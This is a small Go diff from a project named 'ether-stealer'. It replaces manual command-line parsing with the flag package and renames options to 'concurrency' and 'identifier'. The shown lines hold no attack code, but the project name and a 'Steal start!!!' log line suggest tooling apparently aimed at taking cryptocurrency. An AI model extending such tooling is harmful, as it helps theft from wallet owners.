@@ -1,10 +1,8 @@
 package main
 
 import (
+	"flag"
 	"net"
-	"os"
-	"strconv"
-	"strings"
 
 	"github.com/hexoul/ether-stealer/crypto"
 	"github.com/hexoul/ether-stealer/log"
@@ -14,24 +12,13 @@ import (
 )
 
 var (
-	nLimit int
-	who    string
+	nLimit     *int
+	identifier *string
 )
 
 func init() {
-	nLimit = 10
-	for _, val := range os.Args {
-		arg := strings.Split(val, "=")
-		if len(arg) < 2 {
-			continue
-		} else if arg[0] == "-limiter" {
-			if i, err := strconv.Atoi(arg[1]); err == nil {
-				nLimit = i
-			}
-		} else if arg[0] == "-who" {
-			who = arg[1]
-		}
-	}
+	nLimit = flag.Int("concurrency", 10, "The number of threads can be executed concurrently.")
+	identifier = flag.String("identifier", "", "An identifier of a client.")
 }
 
 func main() {
@@ -44,9 +31,9 @@ func main() {
 			}
 		}
 	}
-	log.Info("Steal start!!! from ", ip, " ", who)
+	log.Info("Steal start!!! from ", ip, " ", *identifier)
 
-	limit := limiter.NewConcurrencyLimiter(nLimit)
+	limit := limiter.NewConcurrencyLimiter(*nLimit)
 	// If you want to run finite iterator,
 	// 1. Add condition to `for` statement like `for i:=0; i<N`
 	// 2. Put `limit.Wait()` after `for` statement
